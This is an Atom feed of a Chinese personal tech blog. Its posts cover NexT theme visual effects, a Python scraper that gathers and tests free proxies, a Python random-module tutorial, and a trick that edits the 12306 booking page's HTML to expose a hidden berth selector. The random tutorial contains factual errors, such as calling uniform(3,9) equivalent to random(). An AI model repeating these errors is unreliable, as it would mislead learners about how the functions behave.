<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>嶽General</title>
  
  <subtitle>越努力,越幸运</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://github.com/hjyApple/hjyApple.github.io/"/>
  <updated>2018-11-28T05:45:24.552Z</updated>
  <id>https://github.com/hjyApple/hjyApple.github.io/</id>
  
  <author>
    <name>HJY&#39;s Blog</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Next主题之酷炫背景</title>
    <link href="https://github.com/hjyApple/hjyApple.github.io/2018/11/28/Next%E4%B8%BB%E9%A2%98%E4%B9%8B%E9%85%B7%E7%82%AB%E8%83%8C%E6%99%AF/"/>
    <id>https://github.com/hjyApple/hjyApple.github.io/2018/11/28/Next主题之酷炫背景/</id>
    <published>2018-11-28T04:44:40.000Z</published>
    <updated>2018-11-28T05:45:24.552Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Next主题修改动态线条酷炫背景"><a href="#Next主题修改动态线条酷炫背景" class="headerlink" title="Next主题修改动态线条酷炫背景"></a>Next主题修改动态线条酷炫背景</h4><p>1、进入next主题文件夹下<code>themes\next\layout\</code>,打开<code>_layout.swing</code>文件，在<code>&lt;/body&gt;</code>标签之前插入如下代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if theme.canvas_nest %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span></span></span><br><span class="line"><span class="tag"><span class="attr">color</span>=<span class="string">"255,255,0"</span> <span class="attr">opacity</span>=<span class="string">'0.7'</span> <span class="attr">zIndex</span>=<span class="string">"-2"</span> <span class="attr">count</span>=<span class="string">"99"</span> <span class="attr">src</span>=<span class="string">"//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><p>2、打开主题配置文件<code>themes\next\_config.yml</code>，加入如下代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> # Canvas-nest</span><br><span class="line">canvas_nest: true</span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/9464729-4d4f4cd970cead11.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="39.png"></p><h4 id="Next主题之鼠标点击任意位置出现红心形状"><a href="#Next主题之鼠标点击任意位置出现红心形状" class="headerlink" title="Next主题之鼠标点击任意位置出现红心形状"></a>Next主题之鼠标点击任意位置出现红心形状</h4><p>1、在’themes\next\source\js\src`文件夹下，创建一个love.js文件，并写入以下代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">!<span class="function"><span class="keyword">function</span>(<span class="params">e,t,a</span>)</span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">n</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    c(<span class="string">".heart&#123;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);&#125;.heart:after,.heart:before&#123;content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: fixed;&#125;.heart:after&#123;top: -5px;&#125;.heart:before&#123;left: -5px;&#125;"</span>),o(),r()</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">r</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> e=<span class="number">0</span>;e&lt;d.length;e++)</span><br><span class="line">      d[e].alpha&lt;=<span class="number">0</span>?(t.body.removeChild(d[e].el),d.splice(e,<span class="number">1</span>)):(d[e].y--,d[e].scale+=<span class="number">.004</span>,d[e].alpha-=<span class="number">.013</span>,d[e].el.style.cssText=<span class="string">"left:"</span>+d[e].x+<span class="string">"px;top:"</span>+d[e].y+<span class="string">"px;opacity:"</span>+d[e].alpha+<span class="string">";transform:scale("</span>+d[e].scale+<span class="string">","</span>+d[e].scale+<span class="string">") rotate(45deg);background:"</span>+d[e].color+<span class="string">";z-index:99999"</span>);</span><br><span class="line">    requestAnimationFrame(r)&#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">o</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">var</span> t=<span class="string">"function"</span>==<span class="keyword">typeof</span> e.onclick&amp;&amp;e.onclick;</span><br><span class="line">      e.onclick=<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;t&amp;&amp;t(),i(e)&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">i</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> a=t.createElement(<span class="string">"div"</span>);</span><br><span class="line">      a.className=<span class="string">"heart"</span>,d.push(&#123;<span class="attr">el</span>:a,<span class="attr">x</span>:e.clientX<span class="number">-5</span>,<span class="attr">y</span>:e.clientY<span class="number">-5</span>,<span class="attr">scale</span>:<span class="number">1</span>,<span class="attr">alpha</span>:<span class="number">1</span>,<span class="attr">color</span>:s()&#125;),t.body.appendChild(a)</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">c</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> a=t.createElement(<span class="string">"style"</span>);</span><br><span class="line">    a.type=<span class="string">"text/css"</span>;</span><br><span class="line">    <span class="keyword">try</span>&#123;a.appendChild(t.createTextNode(e))&#125;<span class="keyword">catch</span>(t)&#123;a.styleSheet.cssText=e&#125;t.getElementsByTagName(<span class="string">"head"</span>)[<span class="number">0</span>].appendChild(a)&#125;<span class="function"><span class="keyword">function</span> <span class="title">s</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span><span class="string">"rgb("</span>+~~(<span class="number">255</span>*<span class="built_in">Math</span>.random())+<span class="string">","</span>+~~(<span class="number">255</span>*<span class="built_in">Math</span>.random())+<span class="string">","</span>+~~(<span class="number">255</span>*<span class="built_in">Math</span>.random())+<span class="string">")"</span>&#125;<span class="keyword">var</span> d=[];</span><br><span class="line">    e.requestAnimationFrame=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> e.requestAnimationFrame||e.webkitRequestAnimationFrame||e.mozRequestAnimationFrame||e.oRequestAnimationFrame||e.msRequestAnimationFrame||<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;setTimeout(e,<span class="number">1e3</span>/<span class="number">60</span>)&#125;&#125;(),n()&#125;(<span class="built_in">window</span>,<span class="built_in">document</span>);</span><br></pre></td></tr></table></figure><p>2、在<code>\themes\next\layout\_layout.swig</code>文件末尾添加如下代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"/js/src/love.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/9464729-3a5687bd11c8b824.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>最后，提交修改即可</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;Next主题修改动态线条酷炫背景&quot;&gt;&lt;a href=&quot;#Next主题修改动态线条酷炫背景&quot; class=&quot;headerlink&quot; title=&quot;Next主题修改动态线条酷炫背景&quot;&gt;&lt;/a&gt;Next主题修改动态线条酷炫背景&lt;/h4&gt;&lt;p&gt;1、进入next主题文件夹下
      
    
    </summary>
    
      <category term="Web" scheme="https://github.com/hjyApple/hjyApple.github.io/categories/Web/"/>
    
    
      <category term="Web" scheme="https://github.com/hjyApple/hjyApple.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>Proxy_Spider</title>
    <link href="https://github.com/hjyApple/hjyApple.github.io/2018/11/15/Proxy-Spider/"/>
    <id>https://github.com/hjyApple/hjyApple.github.io/2018/11/15/Proxy-Spider/</id>
    <published>2018-11-15T11:11:22.000Z</published>
    <updated>2018-11-15T11:12:19.209Z</updated>
    
    <content type="html"><![CDATA[<h3 id="西刺免费代理IP爬取"><a href="#西刺免费代理IP爬取" class="headerlink" title="西刺免费代理IP爬取"></a>西刺免费代理IP爬取</h3><p>目标URL:<code>http://www.xicidaili.com/wt</code><br>1、本次使用的库为Selector，调用Xpath，个人认为是比较方便的，若使用pip安装失败，可以到<a href="https://www.lfd.uci.edu/~gohlke/pythonlibs/#wordcloud" target="_blank" rel="noopener">库文件下载</a>再使用pip安装，这样会省事，因为直接使用库文件安装会省去本地解析环境这个过程<br>2、分析目标网站源码，获取要爬取的数据的定位<br><img src="https://upload-images.jianshu.io/upload_images/9464729-9e839a36efebd900.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>不难发现，我们要的协议、ip、端口均在td标签里面<br>分别是第2、3、6<br>3、使用Selector库超级方便，<code>selector.xpath</code>即可定位到要获取的数据，再使用<code>/text() #文字形式</code> <code>extract() #原始数据</code><br>自己写的脚本，大牛勿喷<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#  _*_coding:utf-8_*_</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> scrapy.selector <span class="keyword">import</span> Selector</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_all_ip</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">'Upgrade-Insecure-Requests'</span>: <span class="string">'1'</span>,</span><br><span class="line"><span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "</span></span><br><span class="line"><span class="string">"Chrome/59.0.3071.115 Safari/537.36"</span>,</span><br><span class="line"><span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'</span>,</span><br><span class="line"><span class="string">'Referer'</span>: <span class="string">'http://www.xicidaili.com/nt/'</span>,</span><br><span class="line"><span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate, sdch'</span>,</span><br><span class="line"><span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.8'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>,<span class="number">8</span>):</span><br><span class="line">url = <span class="string">'http://www.xicidaili.com/nt/%d'</span> % i</span><br><span class="line">resp = requests.get(url=url,headers=headers)</span><br><span class="line">selector = Selector(text=resp.text)</span><br><span class="line">all_info = selector.xpath(<span class="string">'//*[@id="ip_list"]//tr'</span>)</span><br><span class="line"><span class="comment">#print(all_info)</span></span><br><span class="line"></span><br><span class="line">ip_lists = []</span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> all_info[<span class="number">1</span>:]:</span><br><span class="line">speed = ip.xpath(<span class="string">'td[7]/div/@title'</span>).extract()[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">if</span> speed:</span><br><span class="line">speed_str = float(speed.split(<span class="string">'秒'</span>)[<span class="number">0</span>])</span><br><span class="line">ip_li = ip.xpath(<span class="string">'td[2]/text()'</span>).extract()[<span class="number">0</span>]</span><br><span class="line">type_str = ip.xpath(<span class="string">'td[6]/text()'</span>).extract()[<span class="number">0</span>].lower()  <span class="comment">#大写转小写</span></span><br><span class="line">port_str = ip.xpath(<span class="string">'td[3]/text()'</span>).extract()[<span class="number">0</span>]</span><br><span class="line"><span class="comment"># ip_lists.append((type_str,ip_li,port_str))</span></span><br><span class="line"><span class="comment"># print(ip_lists)</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">proxies = &#123;type_str: type_str + <span class="string">'://'</span> + ip_li + <span class="string">':'</span> +port_str&#125;</span><br><span class="line">req = requests.get(<span class="string">'http://httpbin.org/ip'</span>,headers=headers,proxies=proxies,timeout=<span class="number">2</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="comment">#print('invalid ip and port')</span></span><br><span class="line"><span class="comment">#return False</span></span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">if</span> ((<span class="number">200</span> &lt;= req.status_code) <span class="keyword">and</span> (req.status_code &lt; <span class="number">300</span>)):</span><br><span class="line"><span class="comment">#print(req.text)</span></span><br><span class="line">ip_lists.append((type_str,ip_li,port_str))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="comment">#print(ip_lists)</span></span><br><span class="line"><span class="keyword">return</span> ip_lists</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"><span class="comment">#get_all_ip()</span></span><br><span class="line">ip = get_all_ip()</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> ip:   <span class="comment">#一行一行显示</span></span><br><span class="line">print(x)</span><br></pre></td></tr></table></figure></p><p>4、运行测试<br><img src="https://upload-images.jianshu.io/upload_images/9464729-508e30d40d127d62.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>5、当我们想要使用代理的时候，使用random随机获取几个就可以了<br>6、加了随机获取*条数据的函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#  _*_coding:utf-8_*_</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> scrapy.selector <span class="keyword">import</span> Selector</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_all_ip</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">'Upgrade-Insecure-Requests'</span>: <span class="string">'1'</span>,</span><br><span class="line"><span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "</span></span><br><span class="line"><span class="string">"Chrome/59.0.3071.115 Safari/537.36"</span>,</span><br><span class="line"><span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'</span>,</span><br><span class="line"><span class="string">'Referer'</span>: <span class="string">'http://www.xicidaili.com/nt/'</span>,</span><br><span class="line"><span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate, sdch'</span>,</span><br><span class="line"><span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.8'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">2</span>):</span><br><span class="line">url = <span class="string">'http://www.xicidaili.com/nt/%d'</span> % i</span><br><span class="line">resp = requests.get(url=url,headers=headers)</span><br><span class="line">selector = Selector(text=resp.text)</span><br><span class="line">all_info = selector.xpath(<span class="string">'//*[@id="ip_list"]//tr'</span>)</span><br><span class="line"><span class="comment">#print(all_info)</span></span><br><span class="line"></span><br><span class="line">ip_lists = []</span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> all_info[<span class="number">1</span>:]:</span><br><span class="line">speed = ip.xpath(<span class="string">'td[7]/div/@title'</span>).extract()[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">if</span> speed:</span><br><span class="line">speed_str = float(speed.split(<span class="string">'秒'</span>)[<span class="number">0</span>])</span><br><span class="line">ip_li = ip.xpath(<span class="string">'td[2]/text()'</span>).extract()[<span class="number">0</span>]</span><br><span class="line">type_str = ip.xpath(<span class="string">'td[6]/text()'</span>).extract()[<span class="number">0</span>].lower()  <span class="comment">#大写转小写</span></span><br><span class="line">port_str = ip.xpath(<span class="string">'td[3]/text()'</span>).extract()[<span class="number">0</span>]</span><br><span class="line"><span class="comment"># ip_lists.append((type_str,ip_li,port_str))</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">proxies = &#123;type_str: type_str + <span class="string">'://'</span> + ip_li + <span class="string">':'</span> +port_str&#125;</span><br><span class="line">req = requests.get(<span class="string">'http://httpbin.org/ip'</span>,headers=headers,proxies=proxies,timeout=<span class="number">2</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="comment">#print('invalid ip and port')</span></span><br><span class="line"><span class="comment">#return False</span></span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">if</span> ((<span class="number">200</span> &lt;= req.status_code) <span class="keyword">and</span> (req.status_code &lt; <span class="number">300</span>)):</span><br><span class="line"><span class="comment">#print(req.text)</span></span><br><span class="line">ip_lists.append((type_str,ip_li,port_str))</span><br><span class="line"><span class="comment">#ip_lists.append((type_str + '://' + ip_li + ':' + port_str))</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="keyword">return</span> ip_lists</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">random_ip</span><span class="params">(ip_lists)</span>:</span></span><br><span class="line">proxies = random.sample(ip_lists,<span class="number">6</span>) <span class="comment">#指定随机获取多少条数据</span></span><br><span class="line">print(proxies)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(ip_lists)</span>:</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"proxy.txt"</span>,<span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> ip_lists:</span><br><span class="line">f.write(ip +<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">print(<span class="string">'-'</span>*<span class="number">60</span>)</span><br><span class="line">print(<span class="string">"程序启动中"</span>)</span><br><span class="line">print(<span class="string">'-'</span>*<span class="number">60</span>)</span><br><span class="line">print(<span class="string">"正在获取数据，请稍后...."</span>)</span><br><span class="line">ip = get_all_ip()</span><br><span class="line">print(<span class="string">'随机获取*条数据'</span>)</span><br><span class="line">print(<span class="string">'-'</span>*<span class="number">60</span>)</span><br><span class="line">random_ip(ip)</span><br><span class="line">print(<span class="string">"well done!"</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;西刺免费代理IP爬取&quot;&gt;&lt;a href=&quot;#西刺免费代理IP爬取&quot; class=&quot;headerlink&quot; title=&quot;西刺免费代理IP爬取&quot;&gt;&lt;/a&gt;西刺免费代理IP爬取&lt;/h3&gt;&lt;p&gt;目标URL:&lt;code&gt;http://www.xicidaili.com/w
      
    
    </summary>
    
      <category term="Tools" scheme="https://github.com/hjyApple/hjyApple.github.io/categories/Tools/"/>
    
    
      <category term="Tools" scheme="https://github.com/hjyApple/hjyApple.github.io/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>Python之random函数使用</title>
    <link href="https://github.com/hjyApple/hjyApple.github.io/2018/11/15/Python%E4%B9%8Brandom%E5%87%BD%E6%95%B0%E4%BD%BF%E7%94%A8/"/>
    <id>https://github.com/hjyApple/hjyApple.github.io/2018/11/15/Python之random函数使用/</id>
    <published>2018-11-15T11:05:13.000Z</published>
    <updated>2018-11-15T11:06:49.742Z</updated>
    
    <content type="html"><![CDATA[<p>pthon中random模块的几个函数可以随机生成数值，下面看一下random的几个函数的使用方法。  </p><h5 id="随机生成浮点数"><a href="#随机生成浮点数" class="headerlink" title="随机生成浮点数"></a>随机生成浮点数</h5><p>两个参数，一个是上限，一下是下限<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import random</span><br><span class="line">x = random.uniform(3,9)</span><br><span class="line">等价于</span><br><span class="line">x = random.random()</span><br><span class="line">print x</span><br><span class="line">结果产生会随机选取3-9之间的一个随机浮点数</span><br></pre></td></tr></table></figure></p><h5 id="随机生成指定范围内的整数"><a href="#随机生成指定范围内的整数" class="headerlink" title="随机生成指定范围内的整数"></a>随机生成指定范围内的整数</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x  = random.randint(10,30)</span><br><span class="line">print x</span><br><span class="line">结果会随机选取10—3之间的随机整数</span><br></pre></td></tr></table></figure><h5 id="随机选取指定字符串中的字符"><a href="#随机选取指定字符串中的字符" class="headerlink" title="随机选取指定字符串中的字符"></a>随机选取指定字符串中的字符</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x = random.choice(&apos;absdf&apos;) #参数可以是列表 ([&apos;a&apos;,&apos;b&apos;])</span><br><span class="line">print x</span><br><span class="line">结果就会随机选取字符串中的字符会列表中的一条数据</span><br></pre></td></tr></table></figure><h5 id="从指定序列中随机获取指定长度的片断"><a href="#从指定序列中随机获取指定长度的片断" class="headerlink" title="从指定序列中随机获取指定长度的片断"></a>从指定序列中随机获取指定长度的片断</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">random.sample(&apos;zcvadfgrwta&apos;,3)</span><br><span class="line">wta</span><br><span class="line">#参数如果是元组的话 </span><br><span class="line">结果将选取元组中随机5个数值</span><br></pre></td></tr></table></figure><h5 id="random-randrange"><a href="#random-randrange" class="headerlink" title="random.randrange()"></a>random.randrange()</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">random.randrange(0,50,2)   </span><br><span class="line">用于随机选取0—50之间的随机偶数</span><br></pre></td></tr></table></figure><h5 id="对列表元素随机排序"><a href="#对列表元素随机排序" class="headerlink" title="对列表元素随机排序"></a>对列表元素随机排序</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import random</span><br><span class="line">x = [1,2,3,4,5,6]</span><br><span class="line">random.shuffle(x)</span><br><span class="line">print x</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;pthon中random模块的几个函数可以随机生成数值，下面看一下random的几个函数的使用方法。  &lt;/p&gt;
&lt;h5 id=&quot;随机生成浮点数&quot;&gt;&lt;a href=&quot;#随机生成浮点数&quot; class=&quot;headerlink&quot; title=&quot;随机生成浮点数&quot;&gt;&lt;/a&gt;随机生成浮
      
    
    </summary>
    
      <category term="Python" scheme="https://github.com/hjyApple/hjyApple.github.io/categories/Python/"/>
    
    
      <category term="Python" scheme="https://github.com/hjyApple/hjyApple.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>购买火车票指定铺位</title>
    <link href="https://github.com/hjyApple/hjyApple.github.io/2018/11/14/%E8%B4%AD%E4%B9%B0%E7%81%AB%E8%BD%A6%E7%A5%A8%E6%8C%87%E5%AE%9A%E9%93%BA%E4%BD%8D/"/>
    <id>https://github.com/hjyApple/hjyApple.github.io/2018/11/14/购买火车票指定铺位/</id>
    <published>2018-11-14T12:54:31.000Z</published>
    <updated>2018-11-14T13:01:52.686Z</updated>
    
    <content type="html"><![CDATA[<p>1、生活中总是想着很多美好的事情，接下来要讲的是关于买火车票卧铺时指定铺位<br>2、不建议使用谷歌浏览器，可以使用360安全浏览器，本人使用谷歌浏览器没有成功，然后下载了360浏览器，第一次提交系统直接出错，第二次就成功了<br>3、进入12306官网，登录账户之后，在提交订单前的页面，鼠标放在硬座的地方，右键审查元素，或按下F12再定位硬卧<br><img src="https://upload-images.jianshu.io/upload_images/9464729-b4fc033ffd5bb490.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>3、定位完成之后，点击Edit as HTML<br><img src="https://upload-images.jianshu.io/upload_images/9464729-6239b0377ca54333.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>4、在出来的select框的<code>&lt;/select&gt;</code>的后面，输入以下代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;select name=&quot;passenger_1_seat_detail_select&quot; style=&quot;display:block&quot; id=&quot;passenger_1_seat_detail_select&quot; onchange=&quot;setSeatDetail(&apos;1&apos;)&quot;&gt;</span><br><span class="line">    &lt;option value=&quot;0&quot;&gt;随机&lt;/option&gt;</span><br><span class="line">    &lt;option value=&quot;3&quot;&gt;上铺&lt;/option&gt;</span><br><span class="line">    &lt;option value=&quot;2&quot;&gt;中铺&lt;/option&gt;</span><br><span class="line">    &lt;option value=&quot;1&quot;&gt;下铺&lt;/option&gt;</span><br><span class="line">&lt;/select&gt;</span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/9464729-65472082ccddff47.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>5、输入完成后鼠标点击旁边的标签区域，上面席位旁边就会出现选择铺位的下拉菜单了<br><img src="https://upload-images.jianshu.io/upload_images/9464729-88d9393500b703a0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" 